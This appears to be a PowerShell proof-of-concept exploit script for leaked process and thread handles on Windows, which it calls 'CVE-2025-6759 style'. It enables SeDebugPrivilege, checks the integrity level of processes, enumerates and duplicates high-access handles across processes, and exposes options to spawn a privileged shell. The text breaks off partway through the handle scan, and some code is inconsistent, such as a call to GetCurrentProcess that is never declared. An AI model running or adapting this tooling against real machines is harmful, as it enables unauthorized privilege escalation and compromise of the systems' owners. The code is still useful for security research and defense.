<#
.SYNOPSIS
    Proof of Concept exploit for leaked process/thread handles (CVE-2025-6759 style)
    
.DESCRIPTION
    This script enumerates system handles to find high-privilege process/thread handles
    that have been leaked into low-privilege processes, and can exploit them to spawn
    privileged processes.
    
.PARAMETER TargetPid
    Optional. Only scan handles held by this specific Process ID.
    
.PARAMETER TargetTid
    Optional. Filter for specific Thread IDs (for thread handle exploitation).
    
.PARAMETER ManualHandle
    Optional. Manually specify a handle value (hex format, e.g., "0x1234") to exploit.
    Requires -TargetPid to specify which process owns the handle.
    
.PARAMETER Exploit
    Switch. If set, attempt to spawn a shell when a vulnerable handle is found.

.PARAMETER Force
    Switch. If set, exploit any interesting handle regardless of integrity levels.
    
.PARAMETER Command
    Optional. Command to execute in the spawned process. Defaults to powershell.exe.
    
.EXAMPLE
    .\Invoke-HandleExploit.ps1
    Scans all processes for leaked handles
    
.EXAMPLE
    .\Invoke-HandleExploit.ps1 -TargetPid 1234 -Exploit
    Scans process 1234 for leaked handles and attempts exploitation
    
.EXAMPLE
    .\Invoke-HandleExploit.ps1 -TargetPid 1234 -ManualHandle 0x5678 -Exploit
    Manually exploit handle 0x5678 in process 1234
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [int]$TargetPid = 0,
    
    [Parameter(Mandatory=$false)]
    [int]$TargetTid = 0,
    
    [Parameter(Mandatory=$false)]
    [string]$ManualHandle = "",
    
    [Parameter(Mandatory=$false)]
    [switch]$Exploit,
    
    [Parameter(Mandatory=$false)]
    [switch]$Force,
    
    [Parameter(Mandatory=$false)]
    [string]$Command = "powershell.exe"
)

#region P/Invoke Definitions

$NativeMethods = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

    public class NativeMethodsV5 {
    // Constants
    public const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const int PROCESS_CREATE_PROCESS = 0x0080;
    public const int PROCESS_DUP_HANDLE = 0x0040;
    public const int PROCESS_QUERY_INFORMATION = 0x0400;
    public const int PROCESS_VM_READ = 0x0010;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const int THREAD_ALL_ACCESS = 0x1F03FF;
    public const int THREAD_DIRECT_IMPERSONATION = 0x0200;
    public const int THREAD_SET_CONTEXT = 0x0010;
    public const int THREAD_QUERY_INFORMATION = 0x0040;
    public const int DUPLICATE_SAME_ACCESS = 0x2;
    public const int DUPLICATE_CLOSE_SOURCE = 0x1;
    
    // System Information Classes
    public enum SYSTEM_INFORMATION_CLASS {
        SystemHandleInformation = 16,
        SystemExtendedHandleInformation = 64
    }
    
    // Object Information Classes
    public enum OBJECT_INFORMATION_CLASS {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3
    }
    
    // Thread Information Classes
    public enum THREAD_INFORMATION_CLASS {
        ThreadBasicInformation = 0
    }
    
    // Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        public IntPtr Object;
        public UIntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_HANDLE_INFORMATION_EX {
        public UIntPtr NumberOfHandles;
        public UIntPtr Reserved;
        [MarshalAs(UnmanagedType.ByValArray)]
        public SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] Handles;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_TYPE_INFORMATION {
        public UNICODE_STRING Name;
        public uint TotalNumberOfObjects;
        public uint TotalNumberOfHandles;
        public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;
        public uint TotalNamePoolUsage;
        public uint TotalHandleTableUsage;
        public uint HighWaterNumberOfObjects;
        public uint HighWaterNumberOfHandles;
        public uint HighWaterPagedPoolUsage;
        public uint HighWaterNonPagedPoolUsage;
        public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;
        public uint InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public uint ValidAccessMask;
        public byte SecurityRequired;
        public byte MaintainHandleCount;
        public ushort MaintainTypeList;
        public uint PoolType;
        public uint DefaultPagedPoolCharge;
        public uint DefaultNonPagedPoolCharge;
        public uint DefaultNonPagedPoolCharge2; // Padding?
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct GENERIC_MAPPING {
        public uint GenericRead;
        public uint GenericWrite;
        public uint GenericExecute;
        public uint GenericAll;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION {
        public IntPtr ExitStatus;
        public IntPtr PebBaseAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct THREAD_BASIC_INFORMATION {
        public int ExitStatus;
        public IntPtr TebBaseAddress;
        public CLIENT_ID ClientId;
        public IntPtr AffinityMask;
        public int Priority;
        public int BasePriority;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }
    
    // Privilege Constants
    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const int TOKEN_QUERY = 0x0008;
    
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }
    
    // NtDll Functions
    [DllImport("ntdll.dll")]
    public static extern int NtQuerySystemInformation(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        IntPtr SystemInformation,
        int SystemInformationLength,
        out int ReturnLength
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryObject(
        IntPtr Handle,
        OBJECT_INFORMATION_CLASS ObjectInformationClass,
        IntPtr ObjectInformation,
        int ObjectInformationLength,
        out int ReturnLength
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtDuplicateObject(
        IntPtr SourceProcessHandle,
        IntPtr SourceHandle,
        IntPtr TargetProcessHandle,
        out IntPtr TargetHandle,
        uint DesiredAccess,
        uint Attributes,
        uint Options
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationProcess(
        IntPtr ProcessHandle,
        int ProcessInformationClass,
        IntPtr ProcessInformation,
        int ProcessInformationLength,
        out int ReturnLength
    );
    
    [DllImport("ntdll.dll")]
    public static extern int NtQueryInformationThread(
        IntPtr ThreadHandle,
        THREAD_INFORMATION_CLASS ThreadInformationClass,
        IntPtr ThreadInformation,
        int ThreadInformationLength,
        out int ReturnLength
    );
    
    // Kernel32 Functions
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        int dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId
    );
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool QueryFullProcessImageName(
        IntPtr hProcess,
        int dwFlags,
        StringBuilder lpExeName,
        ref int lpdwSize
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenThread(
        int dwDesiredAccess,
        bool bInheritHandle,
        int dwThreadId
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int GetProcessId(IntPtr Process);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int GetThreadId(IntPtr Thread);

    [DllImport("kernel32.dll")]
    public static extern int GetCurrentThreadId();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DuplicateHandle(
        IntPtr hSourceProcessHandle,
        IntPtr hSourceHandle,
        IntPtr hTargetProcessHandle,
        out IntPtr lpTargetHandle,
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwOptions
    );
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList,
        uint dwFlags,
        IntPtr Attribute,
        IntPtr lpValue,
        IntPtr cbSize,
        IntPtr lpPreviousValue,
        IntPtr lpReturnSize
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList,
        int dwAttributeCount,
        int dwFlags,
        ref IntPtr lpSize
    );
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle
    );
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(
        IntPtr TokenHandle,
        int TokenInformationClass,
        IntPtr TokenInformation,
        int TokenInformationLength,
        out int ReturnLength
    );
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool LookupPrivilegeValue(
        string lpSystemName,
        string lpName,
        out LUID lpLuid
    );
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(
        IntPtr TokenHandle,
        bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState,
        int BufferLength,
        IntPtr PreviousState,
        IntPtr ReturnLength
    );
    
    public const uint TOKEN_QUERY = 0x0008;
    public const int TokenIntegrityLevel = 25;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_MANDATORY_LABEL {
        public SID_AND_ATTRIBUTES Label;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES {
        public IntPtr Sid;
        public uint Attributes;
    }
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ConvertSidToStringSid(IntPtr pSid, out IntPtr pStringSid);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern void LocalFree(IntPtr hMem);
}
"@

if (-not ("NativeMethodsV5" -as [type])) {
    Add-Type -TypeDefinition $NativeMethods -Language CSharp
}
$nativeMethodsType = [NativeMethodsV5]

#endregion

#region Helper Functions

function Enable-SeDebugPrivilege {
    <#
    .SYNOPSIS
    Enables SeDebugPrivilege for the current process token.
    #>
    try {
        $hToken = [IntPtr]::Zero
        $hProcess = [NativeMethodsV5]::GetCurrentProcess()
        
        if (-not [NativeMethodsV5]::OpenProcessToken($hProcess, [NativeMethodsV5]::TOKEN_ADJUST_PRIVILEGES -bor [NativeMethodsV5]::TOKEN_QUERY, [ref]$hToken)) {
            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process token. Error: $lastError"
            return $false
        }
        
        try {
            $luid = New-Object NativeMethodsV5+LUID
            if (-not [NativeMethodsV5]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$luid)) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to lookup SeDebugPrivilege. Error: $lastError"
                return $false
            }
            
            $tokenPrivs = New-Object NativeMethodsV5+TOKEN_PRIVILEGES
            $tokenPrivs.PrivilegeCount = 1
            $tokenPrivs.Privileges.Luid = $luid
            $tokenPrivs.Privileges.Attributes = [NativeMethodsV5]::SE_PRIVILEGE_ENABLED
            
            if (-not [NativeMethodsV5]::AdjustTokenPrivileges($hToken, $false, [ref]$tokenPrivs, 0, [IntPtr]::Zero, [IntPtr]::Zero)) {
                $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to adjust token privileges. Error: $lastError"
                return $false
            }
            
            $lastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($lastError -eq 0) {
                Write-Verbose "Successfully enabled SeDebugPrivilege"
                return $true
            } else {
                Write-Verbose "AdjustTokenPrivileges returned error: $lastError"
                return $false
            }
        } finally {
            [NativeMethodsV5]::CloseHandle($hToken) | Out-Null
        }
    } catch {
        Write-Verbose "Exception in Enable-SeDebugPrivilege: $_"
        return $false
    }
}

function Get-ProcessIntegrityLevel {
    param([int]$ProcessId)
    
    $hProcess = [IntPtr]::Zero
    $hToken = [IntPtr]::Zero
    
    try {
        $hProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_QUERY_INFORMATION, $false, $ProcessId)
        if ($hProcess -eq [IntPtr]::Zero) {
            return "Unknown"
        }
        
        if (-not [NativeMethodsV5]::OpenProcessToken($hProcess, [NativeMethodsV5]::TOKEN_QUERY, [ref]$hToken)) {
            return "Unknown"
        }
        
        $tokenInfoSize = 0
        [NativeMethodsV5]::GetTokenInformation($hToken, [NativeMethodsV5]::TokenIntegrityLevel, [IntPtr]::Zero, 0, [ref]$tokenInfoSize) | Out-Null
        
        if ($tokenInfoSize -eq 0) {
            return "Unknown"
        }
        
        $tokenInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tokenInfoSize)
        try {
            if ([NativeMethodsV5]::GetTokenInformation($hToken, [NativeMethodsV5]::TokenIntegrityLevel, $tokenInfo, $tokenInfoSize, [ref]$tokenInfoSize)) {
                $tokenLabel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tokenInfo, [type][NativeMethodsV5+TOKEN_MANDATORY_LABEL])
                $pStringSid = [IntPtr]::Zero
                if ([NativeMethodsV5]::ConvertSidToStringSid($tokenLabel.Label.Sid, [ref]$pStringSid)) {
                    $sidString = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($pStringSid)
                    [NativeMethodsV5]::LocalFree($pStringSid) | Out-Null
                    
                    if ($sidString -match "S-1-16-(\d+)") {
                        $rid = [int]$matches[1]
                        if ($rid -ge 0x4000) { return "System" }
                        elseif ($rid -ge 0x3000) { return "High" }
                        elseif ($rid -ge 0x2000) { return "Medium" }
                        else { return "Low" }
                    }
                }
            }
        } finally {
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tokenInfo)
        }
    } catch {
        return "Unknown"
    } finally {
        if ($hToken -ne [IntPtr]::Zero) {
            [NativeMethodsV5]::CloseHandle($hToken) | Out-Null
        }
        if ($hProcess -ne [IntPtr]::Zero) {
            [NativeMethodsV5]::CloseHandle($hProcess) | Out-Null
        }
    }
    
    return "Unknown"
}

function Get-ThreadProcessId {
    param([IntPtr]$ThreadHandle)
    
    $tbiSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethodsV5+THREAD_BASIC_INFORMATION])
    $tbiPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tbiSize)
    $returnLength = 0
    
    try {
        $status = [NativeMethodsV5]::NtQueryInformationThread(
            $ThreadHandle,
            [NativeMethodsV5+THREAD_INFORMATION_CLASS]::ThreadBasicInformation,
            $tbiPtr,
            $tbiSize,
            [ref]$returnLength
        )
        
        if ($status -eq 0) {
            $tbi = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tbiPtr, [type][NativeMethodsV5+THREAD_BASIC_INFORMATION])
            $processId = [int][long]$tbi.ClientId.UniqueProcess
            return $processId
        } else {
            Write-Verbose "NtQueryInformationThread failed with status: 0x$($status.ToString('X8'))"
            return $null
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tbiPtr)
    }
}

function Get-HandleTypeIndexByEnumeration {
    # Enumerate handles in current process to identify Process/Thread type indices
    $processTypeIndex = $null
    $threadTypeIndex = $null
    
    $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
    
    $bufferSize = 0x10000
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
    
    try {
        $returnLength = 0
        $status = 0
        
        do {
            if ($status -eq 0xC0000004) { # STATUS_INFO_LENGTH_MISMATCH
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
                $bufferSize = $returnLength
                $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
            }
            
            $status = [NativeMethodsV5]::NtQuerySystemInformation(
                [NativeMethodsV5+SYSTEM_INFORMATION_CLASS]::SystemExtendedHandleInformation,
                $buffer,
                $bufferSize,
                [ref]$returnLength
            )
        } while ($status -eq 0xC0000004) # STATUS_INFO_LENGTH_MISMATCH
        
        if ($status -ne 0) {
            Write-Verbose "Failed to query system handles for type enumeration: 0x$($status.ToString('X8'))"
            return @{ Process = $null; Thread = $null }
        }
        
        $handleInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($buffer, [type][NativeMethodsV5+SYSTEM_HANDLE_INFORMATION_EX])
        $handleCount = [int][uint64]$handleInfo.NumberOfHandles
        $handleEntrySize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethodsV5+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
        
        # Open current process for handle duplication
        $hProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_DUP_HANDLE, $false, $currentPid)
        if ($hProcess -eq [IntPtr]::Zero) {
            Write-Verbose "Failed to open current process for type enumeration"
            return @{ Process = $null; Thread = $null }
        }
        
        try {
            $hCurrentProcessForDup = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_ALL_ACCESS, $false, $currentPid)
            if ($hCurrentProcessForDup -eq [IntPtr]::Zero) {
                Write-Verbose "Failed to open current process for duplication"
                return @{ Process = $null; Thread = $null }
            }
            
            try {
                # Find handles owned by current process and query their types
                for ($i = 0; $i -lt $handleCount; $i++) {
                    if ($processTypeIndex -ne $null -and $threadTypeIndex -ne $null) {
                        break
                    }
                    
                    $entryPtr = [IntPtr]($buffer.ToInt64() + 16 + ($i * $handleEntrySize))
                    $entry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($entryPtr, [type][NativeMethodsV5+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
                    
                    $ownerPid = [int][uint64]$entry.UniqueProcessId
                    if ($ownerPid -ne $currentPid) {
                        continue
                    }
                    
                    $handleValue = $entry.HandleValue
                    $typeIndex = $entry.ObjectTypeIndex
                    
                    # Skip if we already know this type index
                    if ($typeIndex -eq $processTypeIndex -or $typeIndex -eq $threadTypeIndex) {
                        continue
                    }
                    
                    # Try to duplicate and query the handle type
                    $hDup = [IntPtr]::Zero
                    try {
                        $dupStatus = [NativeMethodsV5]::NtDuplicateObject(
                            $hProcess,
                            $handleValue,
                            $hCurrentProcessForDup,
                            [ref]$hDup,
                            0,
                            0,
                            0
                        )
                        
                        if ($dupStatus -eq 0 -and $hDup -ne [IntPtr]::Zero) {
                            $objInfoSize = 0
                            [NativeMethodsV5]::NtQueryObject($hDup, [NativeMethodsV5+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, [IntPtr]::Zero, 0, [ref]$objInfoSize) | Out-Null
                            
                            if ($objInfoSize -gt 0) {
                                $objInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($objInfoSize)
                                try {
                                    if ([NativeMethodsV5]::NtQueryObject($hDup, [NativeMethodsV5+OBJECT_INFORMATION_CLASS]::ObjectTypeInformation, $objInfo, $objInfoSize, [ref]$objInfoSize) -eq 0) {
                                        $typeInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($objInfo, [type][NativeMethodsV5+OBJECT_TYPE_INFORMATION])
                                        $typeNamePtr = $typeInfo.Name.Buffer
                                        $typeNameLength = $typeInfo.Name.Length / 2
                                        $typeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($typeNamePtr, $typeNameLength)
                                        
                                        if ($typeName -eq "Process" -and $null -eq $processTypeIndex) {
                                            $processTypeIndex = $typeIndex
                                        }
                                        if ($typeName -eq "Thread" -and $null -eq $threadTypeIndex) {
                                            $threadTypeIndex = $typeIndex
                                        }
                                    }
                                } finally {
                                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($objInfo)
                                }
                            }
                        }
                    } finally {
                        if ($hDup -ne [IntPtr]::Zero) {
                            [NativeMethodsV5]::CloseHandle($hDup) | Out-Null
                        }
                    }
                }
            } finally {
                [NativeMethodsV5]::CloseHandle($hCurrentProcessForDup) | Out-Null
            }
        } finally {
            [NativeMethodsV5]::CloseHandle($hProcess) | Out-Null
        }
    } finally {
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
    }
    
    return @{
        Process = $processTypeIndex
        Thread = $threadTypeIndex
    }
}

function Get-SystemHandles {
    param(
        [int]$FilterPid = 0
    )
    
    $bufferSize = 0x10000
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
    $handles = @()
    
    try {
        $returnLength = 0
        $status = 0
        
        do {
            if ($status -eq 0xC0000004) { # STATUS_INFO_LENGTH_MISMATCH
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buffer)
                $bufferSize = $returnLength * 2
                $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bufferSize)
            }
            
            $status = [NativeMethodsV5]::NtQuerySystemInformation(
                [NativeMethodsV5+SYSTEM_INFORMATION_CLASS]::SystemExtendedHandleInformation,
                $buffer,
                $bufferSize,
                [ref]$returnLength
            )
        } while ($status -eq 0xC0000004) # STATUS_INFO_LENGTH_MISMATCH
        
        if ($status -ne 0) {
            Write-Error "Failed to query system handles: 0x$($status.ToString('X8'))"
            return $handles
        }
        
        $handleInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($buffer, [type][NativeMethodsV5+SYSTEM_HANDLE_INFORMATION_EX])
        $handleCount = [int][uint64]$handleInfo.NumberOfHandles
        
        Write-Verbose "Found $handleCount total handles"
        
        $handleEntrySize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethodsV5+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
        
        # Get type indices
        $typeIndices = Get-HandleTypeIndexByEnumeration
        $processTypeIndex = $typeIndices.Process
        $threadTypeIndex = $typeIndices.Thread
        
        Write-Verbose "Process Type Index: $processTypeIndex, Thread Type Index: $threadTypeIndex"
        
        if ($null -eq $processTypeIndex -and $null -eq $threadTypeIndex) {
            Write-Warning "Failed to identify Process or Thread type indices. Continuing with limited functionality."
        }
        
        # Group handles by OwnerPid for performance optimization
        $handlesByOwner = @{}
        $currentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
        $hCurrentProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_ALL_ACCESS, $false, $currentPid)
        
        try {
            # First pass: collect and group handles
            for ($i = 0; $i -lt $handleCount; $i++) {
                $entryPtr = [IntPtr]($buffer.ToInt64() + 16 + ($i * $handleEntrySize))
                $entry = [System.Runtime.InteropServices.Marshal]::PtrToStructure($entryPtr, [type][NativeMethodsV5+SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX])
                
                $ownerPid = [int][uint64]$entry.UniqueProcessId
                $handleValue = $entry.HandleValue
                $typeIndex = $entry.ObjectTypeIndex
                $access = $entry.GrantedAccess
                
                # Filter by PID if specified
                if ($FilterPid -ne 0 -and $ownerPid -ne $FilterPid) {
                    continue
                }
                
                # Filter for Process or Thread handles
                if ($typeIndex -ne $processTypeIndex -and $typeIndex -ne $threadTypeIndex) {
                    continue
                }
                
                $handleType = if ($typeIndex -eq $processTypeIndex) { "Process" } else { "Thread" }
                
                # Check for interesting access rights
                $interestingAccess = $false
                if ($handleType -eq "Process") {
                    if (($access -band [NativeMethodsV5]::PROCESS_ALL_ACCESS) -eq [NativeMethodsV5]::PROCESS_ALL_ACCESS) {
                        $interestingAccess = $true
                    } elseif ($access -band [NativeMethodsV5]::PROCESS_CREATE_PROCESS) {
                        $interestingAccess = $true
                    } elseif ($access -band [NativeMethodsV5]::PROCESS_DUP_HANDLE) {
                        $interestingAccess = $true
                    } elseif ($access -band [NativeMethodsV5]::PROCESS_VM_WRITE) {
                        $interestingAccess = $true
                    }
                } else {
                    if (($access -band [NativeMethodsV5]::THREAD_ALL_ACCESS) -eq [NativeMethodsV5]::THREAD_ALL_ACCESS) {
                        $interestingAccess = $true
                    } elseif ($access -band [NativeMethodsV5]::THREAD_DIRECT_IMPERSONATION) {
                        $interestingAccess = $true
                    } elseif ($access -band [NativeMethodsV5]::THREAD_SET_CONTEXT) {
                        $interestingAccess = $true
                    }
                }
                
                if ($interestingAccess) {
                    if (-not $handlesByOwner.ContainsKey($ownerPid)) {
                        $handlesByOwner[$ownerPid] = @()
                    }
                    $handlesByOwner[$ownerPid] += @{
                        HandleValue = $handleValue
                        HandleType = $handleType
                        Access = $access
                        TypeIndex = $typeIndex
                    }
                }
            }
            
            # Second pass: process handles grouped by owner (open owner process once per group)
            foreach ($ownerPid in $handlesByOwner.Keys) {
                $ownerIntegrity = Get-ProcessIntegrityLevel $ownerPid
                
                $hOwnerProcess = [IntPtr]::Zero
                try {
                    $hOwnerProcess = [NativeMethodsV5]::OpenProcess([NativeMethodsV5]::PROCESS_DUP_HANDLE, $false, $ownerPid)
                    if ($hOwnerProcess -eq [IntPtr]::Zero) {
                        Write-Verbose "OpenProcess(PROCESS_DUP_HANDLE) failed for PID $ownerPid"
                        continue
                    }
                    
                    foreach ($handleEntry in $handlesByOwner[$ownerPid]) {
                        $handleValue = $handleEntry.HandleValue
                        $handleType = $handleEntry.HandleType
                        $access = $handleEntry.Access
                        
                        $targetPid = $null
                        $targetTid = $null
                        $hDup = [IntPtr]::Zero
                        
                        try {
                            $dupStatus = [NativeMethodsV5]::NtDuplicateObject(
                                $hOwnerProcess,
                                $handleValue,
                                $hCurrentProcess,
                                [ref]$hDup,
                                0,
                                0,
                                0
                            )
                            
                            if ($dupStatus -eq 0 -and $hDup -ne [IntPtr]::Zero) {
                                if ($handleType -eq "Process") {
                                    $targetPid = [NativeMethodsV5]::GetProcessId($hDup)
                                    if ($targetPid -eq 0) {
                                        Write-Verbose "GetProcessId returned 0 for duplicated handle from process $ownerPid. Trying NtQueryInformationProcess..."
                                        
                                        # Fallback: NtQueryInformationProcess
                                        $pbiSize = [System.Runtime.InteropServices.Marshal]::SizeOf([type][NativeMethodsV5+PROCESS_BASIC_INFORMATION])
                                        $pbiPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($pbiSize)
                                        $returnLength = 0
                                        
                                        try {
                                            $status = [NativeMethodsV5]::NtQueryInformationProcess(
                                                $hDup,
                                                0, # ProcessBasicInformation
                                                $pbiPtr,
                                                $pbiSize,
                                                [ref]$returnLength
                                            )
                                            
                                            if ($status -eq 0) {
                                                $pbi = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pbiPtr, [type][NativeMethodsV5+PROCESS_BASIC_INFORMATION])
                                                $targetPid = [int][long]$pbi.UniqueProcessId
                                                Write-Verbose "NtQueryInformationProcess recovered TargetPid: $targetPid"
                                            } else {
                                                Write-Verbose "NtQueryInformationProcess failed with status: 0x$($status.ToString('X8'))"
                                            }
                                        } finally {
                                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pbiPtr)
                                        }
                                    }
                                } else {
                                    $targetTid = [NativeMethodsV5]::GetThreadId($hDup)
                                    $targetPid = Get-ThreadProcessId -ThreadHandle $hDup
                                }
                            } else {
                                Write-Verbose "NtDuplicateObject failed: 0x$($dupStatus.ToString('X8')) for process $ownerPid handle $handleValue"
                            }
                        } finally {
                            if ($hDup -ne [IntPtr]::Zero) {
                                [NativeMethodsV5]::CloseHandle($hDup) | Out-Null
                            }
                        }
                        
                        if ($targetPid) {
                            $targetIntegrity = Get-ProcessIntegrityLevel $targetPid
                        } else {
                            $targetIntegrity = "Unknown"
                        }
                        
                        # Build access rights list
                        $accessRights = @()
                        if ($handleType -eq "Process") {
                            if (($access -band [NativeMethodsV5]::PROCESS_ALL_ACCESS) -eq [NativeMethodsV5]::PROCESS_ALL_ACCESS) {
                                $accessRights += "PROCESS_ALL_ACCESS"
                            }
                            if ($access -band [NativeMethodsV5]::PROCESS_CREATE_PROCESS) {
                                $accessRights += "PROCESS_CREATE_PROCESS"
                            }
